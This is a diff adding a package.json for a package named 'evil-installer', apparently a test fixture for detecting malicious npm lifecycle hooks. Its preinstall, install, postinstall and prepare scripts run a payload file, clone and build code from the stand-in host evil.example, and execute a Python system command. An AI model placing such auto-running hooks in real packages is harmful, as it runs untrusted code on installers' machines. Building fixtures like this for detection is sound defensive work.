@@ -1,0 +1,12 @@
+{
+  "name": "evil-installer",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "npx --yes evil-installer",
+    "install": "node ./scripts/payload.js",
+    "postinstall": "git clone https://evil.example/repo && make",
+    "prepare": "python -c 'import os; os.system(\"touch pwned\")'",
+    "prepublishOnly": "node evil.js",
+    "test": "jest"
+  }
+}
